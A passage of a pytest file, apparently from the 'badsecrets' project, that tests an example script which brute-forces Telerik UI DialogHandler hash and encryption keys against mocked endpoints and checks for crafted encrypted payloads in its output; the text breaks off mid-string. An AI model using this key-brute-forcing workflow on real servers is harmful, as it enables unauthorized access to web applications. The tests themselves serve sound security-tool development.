import os
import sys
import requests
import requests_mock
from mock import patch


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(f"{os.path.dirname(SCRIPT_DIR)}/examples")
from badsecrets.examples import telerik_knownkey

from badsecrets import modules_loaded

Telerik_HashKey = modules_loaded["telerik_hashkey"]
Telerik_EncryptionKey = modules_loaded["telerik_encryptionkey"]


partial_dialog_page = """
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D9FD575A" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAJspJIt1GVCOCk05y5PNKqHr1eUXYH2SY42AOoXP1wAYw2bbvWgGSKjsWouPBAT+yhhHBVc" /><input type="hidden" name="dialogParametersHolder" id="dialogParametersHolder" /><div style='text-align:center;'>Loading the dialog...</div>

<script type="text/javascript">
"""


def PBKDF2_found_key_matcher(request):
    if (
        request.body
        == "dialogParametersHolder=Ct3E%2FAXZ0ct05hNqzzSbCRVxte%2F%2BQBIVbVz21p21CqLSnQsGfzTjsiq%2FxoAQaaDuaafBKu8cNXMOGT5kJcE0snNDBVbQqvbQLEYa1cWQYr%2FL2tOMq8Rnuzq6F7HKpN2%2BUJzGeJxt25pqbTTLzS1VwSSsBRgS3Y13wCJNk24A%2BmI%3D"
    ):
        return True
    return False


def PBKDF2_found_key_matcher_negative(request):
    if (
        request.body
        == "dialogParametersHolder=Ct3E%2FAXZ0ct05hNqzzSbCRVxte%2F%2BQBIVbVz21p21CqLSnQsGfzTjsiq%2FxoAQaaDuaafBKu8cNXMOGT5kJcE0snNDBVbQqvbQLEYa1cWQYr%2FL2tOMq8Rnuzq6F7HKpN2%2BUJzGeJxt25pqbTTLzS1VwSSsBRgS3Y13wCJNk24A%2BmI%3D"
    ):
        return False
    return True


def PBKDF1_MS_found_key_matcher(request):
    if (
        request.body
        == "dialogParametersHolder=RW5hYmxlQXN5bmNVcGxvYWQsRmFsc2UsMyxUcnVlO0RlbGV0ZVBhdGhzLFRydWUsMCxabWs0ZFV4M1BUMHNabWs0ZFV4M1BUMD07RW5hYmxlRW1iZWRkZWRCYXNlU3R5bGVzaGVldCxGYWxzZSwzLFRydWU7UmVuZGVyTW9kZSxGYWxzZSwyLDI7VXBsb2FkUGF0aHMsVHJ1ZSwwLFptazRkVXgzUFQwc1ptazRkVXgzUFQwPTtTZWFyY2hQYXR0ZXJucyxUcnVlLDAsUzJrMGNRPT07RW5hYmxlRW1iZWRkZWRTa2lucyxGYWxzZSwzLFRydWU7TWF4VXBsb2FkRmlsZVNpemUsRmFsc2UsMSwyMDQ4MDA7TG9jYWxpemF0aW9uUGF0aCxGYWxzZSwwLDtGaWxlQnJvd3NlckNvbnRlbnRQcm92aWRlclR5cGVOYW1lLEZhbHNlLDAsO1ZpZXdQYXRocyxUcnVlLDAsWm1rNGRVeDNQVDBzWm1rNGRVeDNQVDA9O0lzU2tpblRvdWNoLEZhbHNlLDMsRmFsc2U7U2NyaXB0TWFuYWdlclByb3BlcnRpZXMsRmFsc2UsMCxDZ29LQ2taaGJITmxDakFLQ2dvSztFeHRlcm5hbERpYWxvZ3NQYXRoLEZhbHNlLDAsO0xhbmd1YWdlLEZhbHNlLDAsWlc0dFZWTT07VGVsZXJpay5EaWFsb2dEZWZpbml0aW9uLkRpYWxvZ1R5cGVOYW1lLEZhbHNlLDAsVkdWc1pYSnBheTVYWldJdVZVa3VSV1JwZEc5eUxrUnBZV3h2WjBOdmJuUnliMnh6TGtSdlkzVnRaVzUwVFdGdVlXZGxja1JwWVd4dlp5d2dWR1ZzWlhKcGF5NVhaV0l1VlVrc0lGWmxjbk5wYjI0OU1qQXhPQzR4TGpFeE55NDBOU3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMHhNakZtWVdVM09ERTJOV0poTTJRMDtBbGxvd011bHRpcGxlU2VsZWN0aW9uLEZhbHNlLDMsRmFsc2U%3DL5sb9SKliKw%2Bw6w13%2FzMlFZ52mRvsWTpQO3uN4eQQ7k%3D"
        and request.body != "dialogParametersHolder=AAAA"
    ):
        return True
    return False


def PBKDF1_MS_found_key_matcher_negative(request):
    if (
        request.body
        == "dialogParametersHolder=RW5hYmxlQXN5bmNVcGxvYWQsRmFsc2UsMyxUcnVlO0RlbGV0ZVBhdGhzLFRydWUsMCxabWs0ZFV4M1BUMHNabWs0ZFV4M1BUMD07RW5hYmxlRW1iZWRkZWRCYXNlU3R5bGVzaGVldCxGYWxzZSwzLFRydWU7UmVuZGVyTW9kZSxGYWxzZSwyLDI7VXBsb2FkUGF0aHMsVHJ1ZSwwLFptazRkVXgzUFQwc1ptazRkVXgzUFQwPTtTZWFyY2hQYXR0ZXJucyxUcnVlLDAsUzJrMGNRPT07RW5hYmxlRW1iZWRkZWRTa2lucyxGYWxzZSwzLFRydWU7TWF4VXBsb2FkRmlsZVNpemUsRmFsc2UsMSwyMDQ4MDA7TG9jYWxpemF0aW9uUGF0aCxGYWxzZSwwLDtGaWxlQnJvd3NlckNvbnRlbnRQcm92aWRlclR5cGVOYW1lLEZhbHNlLDAsO1ZpZXdQYXRocyxUcnVlLDAsWm1rNGRVeDNQVDBzWm1rNGRVeDNQVDA9O0lzU2tpblRvdWNoLEZhbHNlLDMsRmFsc2U7U2NyaXB0TWFuYWdlclByb3BlcnRpZXMsRmFsc2UsMCxDZ29LQ2taaGJITmxDakFLQ2dvSztFeHRlcm5hbERpYWxvZ3NQYXRoLEZhbHNlLDAsO0xhbmd1YWdlLEZhbHNlLDAsWlc0dFZWTT07VGVsZXJpay5EaWFsb2dEZWZpbml0aW9uLkRpYWxvZ1R5cGVOYW1lLEZhbHNlLDAsVkdWc1pYSnBheTVYWldJdVZVa3VSV1JwZEc5eUxrUnBZV3h2WjBOdmJuUnliMnh6TGtSdlkzVnRaVzUwVFdGdVlXZGxja1JwWVd4dlp5d2dWR1ZzWlhKcGF5NVhaV0l1VlVrc0lGWmxjbk5wYjI0OU1qQXhPQzR4TGpFeE55NDBOU3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMHhNakZtWVdVM09ERTJOV0poTTJRMDtBbGxvd011bHRpcGxlU2VsZWN0aW9uLEZhbHNlLDMsRmFsc2U%3DL5sb9SKliKw%2Bw6w13%2FzMlFZ52mRvsWTpQO3uN4eQQ7k%3D"
        and request.body != "dialogParametersHolder=AAAA"
    ):
        return False
    return True


def PBKDF1_MS_probe_matcher(request):
    if request.body == "dialogParametersHolder=AAAA":
        return True
    return False


def PBKDF1_MS_encryption_probe_matcher(request):
    if (
        request.body
        == "dialogParametersHolder=CaCbLSlA%2F3GG4AJY2Lrkw%2FYyoo9hsLMk7MDf5Ku5qk7ALj2MhWj%2BdiVwDJIpxdOfGYYKT%2BtFcvqOSZPRZZas0cgfM1xZtoJ0rDr0vHZCeKF2MchSI7T4s1rp%2F17FOhy0VFUWETHfD47ah6CDQGtptldvlYp5Iq5FSRMgJrFZ6V8%3D"
    ):
        return True
    return False


def PBKDF1_MS_version_probe_matcher_incorrect(request):
    if (
        request.body != "dialogParametersHolder=AAAA"
        and request.body
        != "dialogParametersHolder=RW5hYmxlQXN5bmNVcGxvYWQsRmFsc2UsMyxUcnVlO0RlbGV0ZVBhdGhzLFRydWUsMCxabWs0ZFV4M1BUMHNabWs0ZFV4M1BUMD07RW5hYmxlRW1iZWRkZWRCYXNlU3R5bGVzaGVldCxGYWxzZSwzLFRydWU7UmVuZGVyTW9kZSxGYWxzZSwyLDI7VXBsb2FkUGF0aHMsVHJ1ZSwwLFptazRkVXgzUFQwc1ptazRkVXgzUFQwPTtTZWFyY2hQYXR0ZXJucyxUcnVlLDAsUzJrMGNRPT07RW5hYmxlRW1iZWRkZWRTa2lucyxGYWxzZSwzLFRydWU7TWF4VXBsb2FkRmlsZVNpemUsRmFsc2UsMSwyMDQ4MDA7TG9jYWxpemF0aW9uUGF0aCxGYWxzZSwwLDtGaWxlQnJvd3NlckNvbnRlbnRQcm92aWRlclR5cGVOYW1lLEZhbHNlLDAsO1ZpZXdQYXRocyxUcnVlLDAsWm1rNGRVeDNQVDBzWm1rNGRVeDNQVDA9O0lzU2tpblRvdWNoLEZhbHNlLDMsRmFsc2U7U2NyaXB0TWFuYWdlclByb3BlcnRpZXMsRmFsc2UsMCxDZ29LQ2taaGJITmxDakFLQ2dvSztFeHRlcm5hbERpYWxvZ3NQYXRoLEZhbHNlLDAsO0xhbmd1YWdlLEZhbHNlLDAsWlc0dFZWTT07VGVsZXJpay5EaWFsb2dEZWZpbml0aW9uLkRpYWxvZ1R5cGVOYW1lLEZhbHNlLDAsVkdWc1pYSnBheTVYWldJdVZVa3VSV1JwZEc5eUxrUnBZV3h2WjBOdmJuUnliMnh6TGtSdlkzVnRaVzUwVFdGdVlXZGxja1JwWVd4dlp5d2dWR1ZzWlhKcGF5NVhaV0l1VlVrc0lGWmxjbk5wYjI0OU1qQXhPQzR4TGpFeE55NDBOU3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMHhNakZtWVdVM09ERTJOV0poTTJRMDtBbGxvd011bHRpcGxlU2VsZWN0aW9uLEZhbHNlLDMsRmFsc2U%3DL5sb9SKliKw%2Bw6w13%2FzMlFZ52mRvsWTpQO3uN4eQQ7k%3D"
        and request.body
        != "dialogParametersHolder=CaCbLSlA%2F3GG4AJY2Lrkw%2FYyoo9hsLMk7MDf5Ku5qk7ALj2MhWj%2BdiVwDJIpxdOfGYYKT%2BtFcvqOSZPRZZas0cgfM1xZtoJ0rDr0vHZCeKF2MchSI7T4s1rp%2F17FOhy0VFUWETHfD47ah6CDQGtptldvlYp5Iq5FSRMgJrFZ6V8%3D"
        and request.body
        != "dialogParametersHolder=gRRgyE4BOGtN%2FLtBxeEeJDuLj%2FUwIG4oBhO5rCDfPjeH10P8Y02mDK3B%2FtsdOIrwILK7XjQiuTlTZMgHckSyb518JPAo6evNlVTPWD5AZX5l4UIUkfdJvq28UHyeBA4eC58PfA6nG7V2Q97Qwqef6cpbM6t88zvE0wJt8uUKji4ZfyBif4du8JgpDzzdSi%2BlWYd3YhzNbbfKVH%2F0sfraIHOsRvwNwrVc0V%2Fnmn%2BGlqm1rheswSONIo7BzKo04RLb232aDuWcluEWDMFdNJpzpdgcq96mWrs9KttFyRjUZ%2FhUi8ZQi0R4GXCrfHRTAYOq%2B2TNdECbAEfmA4n9Pb0BDDGDfghLV6h%2FbLrUaMWZCx6U5zCQfymn96h1t5acGgfxYMCS%2FYS7WRPytc759VdSM2KhGVmuGlupbxVz5gVOWffo5rTDQxwiPhcWYHTJlN%2FawmJfHJsJV0WvTBaW9nEPL0QeeUEu3jc7OPW9CbVufHb7Rfg7RQ%2F6Gjz5TBlzfY32lcFTsyRolWjxU3%2FVBb09tcN2EJGBnjZxpl6eFsYOvexTx0ykt0PCQagdR0DPFLPsdj7kDMrdDhpMDjsqQA0W06ULEtlR8unWsjavyK0%2B8CuTN%2BkuMzFrH10Wvqb5j3SYwANq3pyEuf3OScByrY8NVz7EzX%2BYQb5%2FByHmXi99NCHbO6ZQyHnM%2BPWYwinlnFrU6f%2BvI2ruMl35dZ%2BWWSGnEdv0DVxiedxWgqDlov31JoGaaffpBs8OO3LhtYqIixQPFbjq2wPrEcHPLgM40eYtJfduPI6exc%2BkKlxFGOyB44XjDuC4VHBPmCCFH%2FguBAatG%2FSZU1z%2Fj%2FJ0YDIVedDDdPg2NtQXjjjidSW8ISbfOk1SoLSFz04F9BmmMnPVsg9Dvtbbf%2Bz%2FhudrAo9Ys%2Fa6OzksFXxwQ%2FcSIDYVAsYkRjDMcgRv6erm8bBqgABiSF7SwBLkL75mI18fA3qCxgYDrcXZJYCIbS%2BQg9QiROf7PnRBcrnAg0G2ArfRY5gQE69DA4hvUFuXZvCbVbqQGZs7TrKNqBH40DzPqKFqhBKawuCF84zc08QzWVdbl92rAUl%2FbGi6RYzgx27pPzu7LbYLl4G8a5vtVZjuK7SchY0B7FfMvF3uQA%2FY4G%2FjqDGqGshadxalKPmwfUNbDSaatepav%2Bx4zfzQhn6cV2r8t1qz1TfHypR%2BCaAEVhEa36reVmWrAKXjr0JFOSSAQJTti%2BKhNRhaVPTgVI%2BsX%2F0pf8Fn0Zvv%2FbPL9C9L1pEAco%2FGIOV9AHNoh5E18zHcmINA2HmoZWha91ONomoIGvWnlM5USb%2FYSrXZuJDsSFFU9oal%2F45NDUNWlNVsXD%2B8RvuVsl1DY7i9iftU%2FtZpskuIldUFYmXWgMWCwk6sQAaARQoQKBEvCL6OV8UcD3bsde0ubcUG9oH140jsAW6Yh7okoKYZlL2xtp4ba7o8CS3R%2FduPuJLFY6fUexkHpvKj1Nn%2B31oQSjRywNhDdNvlczG4Z2LI73TdsZuCKnSPHNF7DNtOxmeGKZl9z9utufWZIb1FetBPy97bOOVKx69nZYTjmfv7hzBuEd5SweBD9QA2WspaycH9H01R4IXXcnrWKHkkaaVS3jDR%2F%2Bll4S0yGKlVT8EiRqLcZVX6mP2C7tmpbTE1tE%2F5ydEXkHMQ4Q75MDhO6F24ahX2rF%2FyfzuAMnR784wtXAM2E3hvVbCzu1rS9Xy1O7uSL%2Fzw1PxRlBZ%2FTwP00bUw22fQfnye%2Fb5s1NmvpWcrSX6tUNlK%2BrCHlfKSxWVhMWiZOqjMq9chUja87UzhcVXYBWZqhfuGsbRIoDQ40P6k7LDTuuzR7UuMU0nPFvGXsfwyu4UQzQppBmjwdQQlpo9GK2XAR7M2Wj5XNB5yZ3n8uMfW%2BktjiC0yW9bo0BVtvvmEOayXYwXyndHauAcJ0HpHnRLtnzNKnTKI3IY%2Fl4kYFS%2BiYUk6n0nd2eVKroYdrMjKZehZmpwmXfU3%2FWpwmt6HK%2FWKAWZzjlEUaN5zDbG%2BtGNxrjYaVvJuDn2uVtmozVU8dbCdz82O6sukqV5QZ86FFImnlZPOKcSHIFq%2F%2B1AdBG%2FUEKZ28aaadpm11H4ovyjAawjFwoWhtDsJB%2F1YbGDIqlKJ40ZOav8gu1Q%2Bv9UtpaQsDfm84FjlzlmwRQn2LF%2FBZLNmAjc8uug0sItSc2bX9d7gR9EWc3KML3PiBecc%2B6LfUkd5WyqHKPP%2FHDETbor16YGv%2Bt3d6KNtQgY3p%2B2Y8kVRCqtngKNzuid%2FXOmNTpwgKgj69id3uo8asDGcs%2B%2FVu5WjbkDNF%2FJlg2TWyTzwpr53wOKmm6tsWwf2FYScCHzXvfWjxHIR9qyGtIOembCqhaK%2Bv7NYDhaI8dAOtvz2su0yzecbzGa65MlwPIyRmv458OLvCMd1BLubANPxC3YfpMHm7x0JllAwNm4K%2BfM73Qkk6jsLwAr28YC1rvMCRONv4Q0sqEpuXfGbS212hv2LeVMq9wrORW353yq2MeRDxFnc2v0oTtVL9D7nlAlBXotJu4rT%2FzhFkH%2Be%2Fbmcbe1sgbaR4BIqrp65Nwq7RjjbB8FX8fi3xA%2BVE68b9DwmAMsub7oVbmI%2B09Wf85hjYjV5fS1xHdKqT6GRTqF9HhkiRxSIDKXzMM7pBXvzwuG%2BOWTVEBOgctSA2alhhyKvUBizsrW6TO%2FSPoX8n%2Fg3qUfufYGrb05PuoeDayC9iZEzmYc%3D"
    ):
        return True
    return False


def test_examples_telerik_knownkey_argparsing(monkeypatch, capsys):
    # URL is required
    monkeypatch.setattr(
        "sys.argv",
        [
            "python",
        ],
    )
    with patch("sys.exit") as exit_mock:
        telerik_knownkey.main()
        assert exit_mock.called
        captured = capsys.readouterr()
        print(captured)
        assert "the following arguments are required: -u/--url" in captured.err

    # Invalid URL is rejected

    monkeypatch.setattr(
        "sys.argv",
        ["python", "--url", "NOTaURL"],
    )
    with patch("sys.exit") as exit_mock:
        telerik_knownkey.main()
        assert exit_mock.called
        captured = capsys.readouterr()
        print(captured)
        assert "URL is not formatted correctly" in captured.err


def test_non_telerik_ui(monkeypatch, capsys):
    # Non-Telerk UI is detected
    with requests_mock.Mocker() as m:
        m.get(
            f"http://nottelerik.com/Telerik.Web.UI.DialogHandler.aspx",
            status_code=200,
            text="<html><p>Just a regular website</p></html>",
        )
        monkeypatch.setattr(
            "sys.argv",
            ["python", "--url", "http://nottelerik.com/Telerik.Web.UI.DialogHandler.aspx"],
        )
        telerik_knownkey.main()
        captured = capsys.readouterr()
        print(captured)
        assert "URL does not appear to be a Telerik UI DialogHandler" in captured.out


def test_url_not_up(monkeypatch, capsys):
    with requests_mock.Mocker() as m:
        # URL is down - handled correctly

        m.get(f"http://notreal.com/", exc=requests.exceptions.ConnectTimeout)
        monkeypatch.setattr("sys.argv", ["python", "--url", "http://notreal.com"])
        telerik_knownkey.main()
        captured = capsys.readouterr()
        assert "Error connecting to URL" in captured.out


def test_full_run_PBKDF2(monkeypatch, capsys, mocker):
    mocker.patch.object(
        Telerik_EncryptionKey,
        "prepare_keylist",
        return_value=iter(
            ["Not_The_Real_Encryption_Key", "d2a312d9-7af4-43de-be5a-ae717b46cea6", "another_fake_encryption_key"]
        ),
    )
    mocker.patch.object(
        Telerik_HashKey,
        "prepare_keylist",
        return_value=iter(["Not_The_Real_HaSh_Key", "YOUR_ENCRYPTION_KEY_TO_GO_HERE", "Y3t_anoth3r_f@k3_key"]),
    )

    with requests_mock.Mocker() as m:
        # Basic Probe Detects Telerik
        m.get(
            f"http://PBKDF2.telerik.com/Telerik.Web.UI.DialogHandler.aspx", status_code=200, text=partial_dialog_page
        )

        m.post(
            f"http://PBKDF2.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF2_found_key_matcher,
            status_code=200,
            text="Please refresh the editor page.</div><div>Error Message:Index was outside the bounds of the array",
        )

        m.post(
            f"http://PBKDF2.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF2_found_key_matcher_negative,
            status_code=200,
            text="<div>Error Message:Exception of type 'System.Exception' was thrown.</div>",
        )

        monkeypatch.setattr(
            "sys.argv",
            ["python", "--url", "http://PBKDF2.telerik.com/Telerik.Web.UI.DialogHandler.aspx"],
        )
        telerik_knownkey.main()
        captured = capsys.readouterr()
        assert "Target is a newer version of Telerik UI" in captured.out
        assert "Found Encryption key!" in captured.out
        assert "Found matching hashkey!" in captured.out
        assert (
            "%2Bv%2BRs6kf9lDUYnqqYk32Vg84DkpdruQOKGZRmm6RMkaYuxNmvg5Ca5cT%2F74qkOozHIKkG1ovf6XBsjlp4kgO8BJ6KgNcT78BExQZfT1mN5rMO8kcLDRdffFhFXmvAr0o%2F4x%2B9VoRJVaOyGLXk2nhX4OMP%2BjGP2C96Fa6LyfGWHlk1CF0E5mAPeQ6CLbycR88WU5hlmUUqniXC2UdeYd6HO9RFnISEnhq72MkdiEfvNsqAhr2XaCX2%2BQxFXfCLi2%2Fc%2Bn2NmUiFRdhCLutnVxILEnYiRmU5eHJdB2IOTtoc2XZ3NUdZJwrwOswjzCkk7LOwt2bddTvOXdfWtRrbNz1GDNXlPz1cXotgAhucxLLsknNDbeeboMbL%2Bk3tIeervi7oI%2FRQn6Ml3ffUAfcqHzwcZCEIlQXh%2FBEIKHAY9fGKs5JSdtRbREDI0rh9sH%2B0TmYv444WQyqYpa8pOqtxgC1QRRcsNQcVGFzpyNL2SfKSlLTZi5Q7bo8XMTfLG6jg60csDEDiJ7MwJBGIm1iYzt%2FP9JEKkZujTMyHoBI0RESNpux7BeanEIDsfDmfwbcUo%2B2%2BkoHkCE4zXWBdW3lqssk4GwSbc0mbmf3U79rsQdNEqIOL87evE1U6tGB5PuXgwAIj9sKdyffd8%2B%2Bz1CCffFovLM72ilbCmSljAJ%2BvVBfNpTiL7RV7j3XGygljzi4NL8yXJuCLYiNxmqPMdV8DahLed0jSe2mkU1u6rx4yS3dcWEfwMWjI5tVrfnbqtdInC8TliXkTZ919CtORoydmIXGL1u3kdBIq8EZcjRMa4bN4VTvUlbqeIe8p8QYEQwAi7vXiZCKS6R6dmJfQv%2B%2FqBHXWSFuglLYde019GNtNdGQfEnY31zT0Q86ieDYn4k55LbYq5lK8PNjg50gdJxn9fNtHTQ7frKP9vRM4cImRSvDBTATVw1PDzMqn0exo3xciYd5%2BXYAxlFoqwFMDz40w2xR4OWwoPsixpVjR2DYiqYiZrYytFMjziRCLQhkVuJpED8nB9CTlo05WBKN%2Bb4UBHBg%2FkCkHXJxNakIX7UbAjDcqzrNCGhjrgehCGA81uOf0Ppfswda0ZHMi8g9W6Y7uwWmn7Ux7xBMgDCUNIi8I3UvLGXdKnuB8YHX8TLC1z2%2Fm3ip797Pix1ya2sBsbw9KgOJ7PBT0u9W0puchi7zpT%2FzFe3V2HbV0ottDethRJhzaN856VgvjyNhbbmA04gnal%2Fq01j7LNWxEwTjNPyHORI1l9jztvYqItLei7YQYg2pFhmvuv0Od8DPfH40Y1m3mL2F2d%2FAy3ImzFI%2BKQB6mnGPvRcDIS1j7zPhciKRuLfu3dCxhIH7ojo83rhQus3SyXdyZ5cjkFKcG3H7WmBBMOFs2o5xjWcdLARevRbNbqwRfATerc5GuJxy1Qb8RJvOqhDcS5YAHyxVMx2QYU3yMhg0tCpy4wW%2FHsa33feu3NeBu9lRI38ojJNM7o6xYRoSTQu4tYadB4Yh4w60e%2FsttnecOC5plZrLw6BYN2piqvUD07BnO4yTvrpdBDXR%2BMFDchnFh2YK9JtvvtAISvpoSOJojOhwRKuafCwEJn0GB1dsdmOOxxaFHkPXQ7789eCxlTL5mkVf3ktzmHQdDyBxBlDLFWSjmFIBHp%2BPobFdDOmv5p6J3%2F%2FM23PMgGDLRMrj5LVZV3trGV1ZaJHEFIGmVwW0tN4426Q4rCdcxT4ju%2B%2FNhcq90e8crWw9nrF2rPTzW1YM7VqWWwhLj8MtVtGZFa3N%2FxdjEys8FWyT8VqAbC4IltuT5lW1ou1SXsA96h%2F9y3vzJADbm4Lv624OGnh6M%2FCmR930i6YeUlWWmMw1%2FpcZ5werHPm9v0OWulNmGfbNEoKuThz2sSCZ8FLNVToygv1VXPXnur4dJnoCkwBP2%2BQQ6%2FHlyFRXnrrGsiDJE3qtRXgECIhc2zpuC5HAz9FhIfC9VZZ5nxRMbhA6W%2Fz%2BjPpKLCBpmLqHJfy8%2B%2FausiZJv7d9yQ0SvHtq0y%2FSY04hOgZTJul6IIYpObD6s%2FqrGy2nMmY3%2FtEn830%2F%2BFERnXMeBsj%2B%2F5ZSewYe4xBnub1wvSbsA3qjoU5gq7fhDJOhmMQXkbas%2FRholsU9CNKNXpSyqVarqAc8XwaG34JmdG3wjQXd6p%2Bz2jZLew5ja8nelvVdIeN%2F9ejCNOoXcPApYLHyxslcrEuJrSHlAMR4FbonfrFhYYTR%2B8pdxRGYGpVUDxlIRvay5xE4PoiuJ4tF82nhc3kr%2FsJWj86DXt9uK%2FPIDMokhA3fOe%2BrL4lXuzGGv7ZJBaIgkKFliYYdW1axURY4MjnW8jyI5YRuG%2FTCW1ZjBBqDaym%2BmmAjjd2gWID9klXsEA5%2BY%2FjHaDfQJVwm5Bukzr7eZx1zc13OWRVKnbThUNdzOZAEP%2FPnFsxPqZkDZp53nSPzQTJeOldSMnV4YUInoXN%2BTOIcoHAssVkv4iplzNOy1HZT63jfJ1fr6uvhIRZvQ3OolQWlbsk0RoNnFOqXX7lGKYzq8EGCjuwApDN3zvcV16VeRE98GpQUx0qMXOGgo3RdaVqWEOCI4vqhcx3LtEoA8ZDkLqiHKzjqU0UTh92laKWefnBI2XeeKpwZ%2BJireCrS8yWZ%2BLQ2kRDnO2ezbcREVERW7Vvg100MxDKpDVha3oRWNcKtXxu8exJ3ndLi1dY9BNywI3TTnzoW8x0VzAMuyjIfHpvpk0jcqyI3%2BL3cMEU%3D"
            in captured.out
        )
        print(captured)


def test_full_run_PBKDF1_MS(monkeypatch, capsys, mocker):
    mocker.patch.object(
        Telerik_EncryptionKey,
        "prepare_keylist",
        return_value=iter(
            ["Not_The_Real_Encryption_Key", "d2a312d9-7af4-43de-be5a-ae717b46cea6", "another_fake_encryption_key"]
        ),
    )
    mocker.patch.object(
        Telerik_HashKey,
        "prepare_keylist",
        return_value=iter(["Not_The_Real_HaSh_Key", "YOUR_ENCRYPTION_KEY_TO_GO_HERE", "Y3t_anoth3r_f@k3_key"]),
    )

    with requests_mock.Mocker() as m:
        # Basic Probe Detects Telerik
        m.get(
            f"http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            status_code=200,
            text=partial_dialog_page,
        )

        m.post(
            f"http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF1_MS_found_key_matcher,
            status_code=200,
            text="<div>Error Message:The input data is not a complete block.</div>",
        )

        m.post(
            f"http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF1_MS_found_key_matcher_negative,
            status_code=200,
            text="<div>Error Message:The hash is not valid!</div>",
        )

        m.post(
            f"http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF1_MS_probe_matcher,
            status_code=200,
            text="Error Message:Length cannot be less than zero",
        )

        m.post(
            f"http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF1_MS_encryption_probe_matcher,
            status_code=200,
            text="<div>Error Message:Index was outside the bounds of the array.</div>",
        )

        m.post(
            f"http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx",
            additional_matcher=PBKDF1_MS_version_probe_matcher_incorrect,
            status_code=500,
        )

        monkeypatch.setattr(
            "sys.argv",
            ["python", "--url", "http://PBKDF1_MS.telerik.com/Telerik.Web.UI.DialogHandler.aspx"],
        )
        telerik_knownkey.main()
        captured = capsys.readouterr()
        assert "Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key" in captured.out
        assert "Found matching hashkey! [YOUR_ENCRYPTION_KEY_TO_GO_HERE]" in captured.out
        assert "Found Encryption key! [d2a312d9-7af4-43de-be5a-ae717b46cea6]" in captured.out
        assert "Found Telerik Version! [2018.1.117]" in captured.out
        assert (
            "gRRgyE4BOGtN%2FLtBxeEeJDuLj%2FUwIG4oBhO5rCDfPjeH10P8Y02mDK3B%2FtsdOIrwILK7XjQiuTlTZMgHckSyb518JPAo6evNlVTPWD5AZX5l4UIUkfdJvq28UHyeBA4eC58PfA6nG7V2Q97Qwqef6cpbM6t88zvE0wJt8uUKji4ZfyBif4du8JgpDzzdSi%2BlWYd3YhzNbbfKVH%2F0sfraIHOsRvwNwrVc0V%2Fnmn%2BGlqm1rheswSONIo7BzKo04RLb232aDuWcluEWDMFdNJpzpdgcq96mWrs9KttFyRjUZ%2FhUi8ZQi0R4GXCrfHRTAYOq%2B2TNdECbAEfmA4n9Pb0BDDGDfghLV6h%2FbLrUaMWZCx6U5zCQfymn96h1t5acGgfxYMCS%2FYS7WRPytc759VdSM2KhGVmuGlupbxVz5gVOWffo5rTDQxwiPhcWYHTJlN%2FawmJfHJsJV0WvTBaW9nEPL0QeeUEu3jc7OPW9CbVufHb7Rfg7RQ%2F6Gjz5TBlzfY32lcFTsyRolWjxU3%2FVBb09tcN2EJGBnjZxpl6eFsYOvexTx0ykt0PCQagdR0DPFLPsdj7kDMrdDhpMDjsqQA0W06ULEtlR8unWsjavyK0%2B8CuTN%2BkuMzFrH10Wvqb5j3SYwANq3pyEuf3OScByrY8NVz7EzX%2BYQb5%2FByHmXi99NCHbO6ZQyHnM%2BPWYwinlnFrU6f%2BvI2ruMl35dZ%2BWWSGnEdv0DVxiedxWgqDlov31JoGaaffpBs8OO3LhtYqIixQPFbjq2wPrEcHPLgM40eYtJfduPI6exc%2BkKlxFGOyB44XjDuC4VHBPmCCFH%2FguBAatG%2FSZU1z%2Fj%2FJ0YDIVedDDdPg2NtQXjjjidSW8ISbfOk1SoLSFz04F9BmmMnPVsg9Dvtbbf%2Bz%2FhudrAo9Ys%2Fa6OzksFXxwQ%2FcSIDYVAsYkRjDMcgRv6erm8bBqgABiSF7SwBLkL75mI18fA3qCxgYDrcXZJYCIbS%2BQg9QiROf7PnRBcrnAg0G2ArfRY5gQE69DA4hvUFuXZvCbVbqQGZs7TrKNqBH40DzPqKFqhBKawuCF84zc08QzWVdbl92rAUl%2FbGi6RYzgx27pPzu7LbYLl4G8a5vtVZjuK7SchY0B7FfMvF3uQA%2FY4G%2FjqDGqGshadxalKPmwfUNbDSaatepav%2Bx4zfzQhn6cV2r8t1qz1TfHypR%2BCaAEVhEa36reVmWrAKXjr0JFOSSAQJTti%2BKhNRhaVPTgVI%2BsX%2F0pf8Fn0Zvv%2FbPL9C9L1pEAco%2FGIOV9AHNoh5E18zHcmINA2HmoZWha91ONomoIGvWnlM5USb%2FYSrXZuJDsSFFU9oal%2F45NDUNWlNVsXD%2B8RvuVsl1DY7i9iftU%2FtZpskuIldUFYmXWgMWCwk6sQAaARQoQKBEvCL6OV8UcD3bsde0ubcUG9oH140jsAW6Yh7okoKYZlL2xtp4ba7o8CS3R%2FduPuJLFY6fUexkHpvKj1Nn%2B31oQSjRywNhDdNvlczG4Z2LI73TdsZuCKnSPHNF7DNtOxmeGKZl9z9utufWZIb1FetBPy97bOOVKx69nZYTjmfv7hzBuEd5SweBD9QA2WspaycH9H01R4IXXcnrWKHkkaaVS3jDR%2F%2Bll4S0yGKlVT8EiRqLcZVX6mP2C7tmpbTE1tE%2F5ydEXkHMQ4Q75MDhO6F24ahX2rF%2FyfzuAMnR784wtXAM2E3hvVbCzu1rS9Xy1O7uSL%2Fzw1PxRlBZ%2FTwP00bUw22fQfnye%2Fb5s1NmvpWcrSX6tUNlK%2BrC